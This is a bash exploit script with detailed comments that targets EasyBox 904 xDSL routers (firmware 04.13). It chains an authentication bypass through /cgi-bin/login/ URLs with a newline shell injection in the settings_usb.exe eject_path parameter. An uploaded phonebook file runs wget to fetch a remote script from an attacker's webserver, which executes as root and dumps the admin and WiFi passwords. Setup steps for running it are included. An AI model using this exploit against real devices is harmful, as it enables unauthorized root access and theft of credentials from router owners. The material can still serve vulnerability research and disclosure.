#!/bin/bash
#This script exploits two vulnerabilities inside the easy box 904 xDsl Firmware (tested with version 04.13)

#The first vulnerability allows to access endpoints which should only be accessible to authenticated users
#This is probably caused, because the webserver will allow all requests starting with /login
#Requests starting ending with ".exe" will be passed to an executable (/usr/sbin/httpd-brn). 
#This program maps the last portion of the url to a function
#Example: A call to /cgi-bin/upload_phonebook.exe will execute a function which is mapped to upload_phonebook.exe
#Because the webserver allows all urls starting with /cgi-bin/login and the executable only uses the last portion of the url,
#a call to /cgi-bin/upload_phonebook.exe will be blocked as an unauthenticated user, 
#but a call to /login/upload_phonebook.exe will pass without a problem

#The sencond vulnerability is a shell injection
#It exists inside the settings_usb.exe endpoint in (/usr/sbin/httpd-brn). 
#The job of this endpoint is to eject a USB device
#It takes an argument eject_path which is passed to a shell to specify the mounting point of the usb device
#The problem is, that it is possible to inject newline characters to that argument and characters after that newline will be executed as new commands
#Because the maximum length of the eject_path argument is 31 and many characters are blocked (eg. <>&|) the exploit will download a script which is then being executed



#The exploit works like this:
#1: Get a token from the webinterface (this is necessary, becaue all requests without a valid token will be blocked)
#2: Use the upload_phonebook.exe endpoint to upload a phonebook to the router. The uploaded file will be placed in /tmp/phone_book.txt
#     Phonebook entries are in the form of R_N=<name>;<type>;<phone_number> 
#     where 1 <= N <= 200, 
#     name is the name of the contact (length must not exceed 62) 
#     type is the type of the contact eG. "Privat - Festnetz" (german). Values of type are defined by the router. 
#       If you are not in Germany, it could be, that the provided phonebook.txt doesnt work because the type is in german (Privat - Festnetz).
#       In this case you might want to create a phonebook entry inside the router webinterface and export the phonebook to get a valid type
#  It is obvious, that this file can be executed as a script which will execute R_N=<name>;<type>;<phone_number> as variable declarations where command substitution can be used to inject commands
#  Example: R_1=`echo hello world`#;Privat - Festnetz;1111
#3: Make /tmp/phone_book.txt executable and execute /tmp/phone_book.txt by using the shell injection in settings_usb.exe
#     Note that slashes(/) and minus(-) characters are not allowed in phonebook entries. They are passed to the script as paramters ${1}='/' and ${2}='-' (see phonebook.txt)
#4: The phonebook entry "R_1=`wget http:${1}${1}192.168.2.131 ${2}O ${1}tmp${1}exploit`#;Privat - Festnetz;1111" 
#   will be interpreted as a variable declaration with command substitution and thus will execute wget to download a script from a webserver running at the given ip address to /tmp/exploit
#5: make /tmp/exploit executable and execute /tmp/exploit by using the shell injection in settings_usb.exe
#   The script /tmp/exploit is now being executed with root privileges (because the webserver as well as any other service runs as root)
#6: If you use the given exploit script, the script should output the password of the routers webinterface (no hashing was used) and all wifi passwords, just for proof of concept
#   Note that most configuration data is stored in /etc/config/.glbcfg

#setup:
#1: Setup a webserver and serve the remote_script.sh file as index (to keep url short and do not exceed 62 chars)
#2: edit phonebook.txt and replace the ip 192.168.2.131 with the ip of your webserver (make sure server will serve the file when using http and port 80)
#3: set host variable in exploit.bash to the hostname or ip of your easy box (192.168.2.1 is the default value: If your are in local network you shouldnt need to change it) 
#4: run exploit.bash. The router should then download remote_scipt and execute it. After that results should be printed and be written to file usb_cmd_result.txt

set -e
#set ip or hostname of your easy box
host=192.168.2.1

inject () {
echo trying to inject \"$code\" \($(echo $code | wc -c) chars\)

curl --silent -X POST "$host/cgi-bin/login/settings_usb.exe" --data "httoken=$token&eject_path=$code" > /dev/null
}

#the webserver expects a token to accept requests
#the token can be obtained from the main page
echo trying to get token
token=$(curl --silent "$host" | grep -o "httoken='[0-9a-f]*'" | grep -o "[0-9a-f]\{16\}")
echo "token=$token"

#upload phonebook.txt to the router (the 'name' of an phonebook entry must not contain more than 62 characters)
#place the ip or hostname of your webserver to serve the exploit script inside phonebook.txt
#Slashes(/) and minus(-) characters are not allowed. They are passed to the script as paramters later 
#In phonebook.txt ${1}='/' and ${2}='-'
#the phonebook.txt will be placed at /tmp/phone_book.txt inside the easy box
echo trying to upload phonebook
curl -X POST --silent "$host/cgi-bin/login/upload_phonebook.exe" -F "httoken=$token" -F "phonebookUpload=@phonebook.txt" > /dev/null

#now set executable flag for /tmp/phone_book.txt
code='
chmod 777 /tmp/phone_book.txt '
inject

#now execute /tmp/phone_book.txt as a script
#note that slashes and minus chars are passed as paramters because it is not allowed to use them in phonebook entries
#it should execute wget and download the actual exploit script to /tmp/exploit
code='
/tmp/pho* / $'"'\055'"
inject

#now set executable flag for /tmp/exploit
code='
chmod 777 /tmp/exploit'
inject

#execute /tmp/exploit file
code='
/tmp/exploit '
inject

#there is an endpoint for executing ping requests. This function will execute the ping command and pipe output to /tmp/ping_result
#the endpoint status_dl_ping_result.exe will download the /tmp/ping_result file
#we can use this function for getting output from the router
echo trying to download /tmp/ping_result
FILE=./usb_cmd_result.txt
curl --silent "$host/cgi-bin/login/status_dl_ping_result.exe" --data "httoken=$token&is_dl=1" --output $FILE > /dev/null
if [ -f "$FILE" ]; then
    echo "Output from easy box:"
    cat $FILE
fi
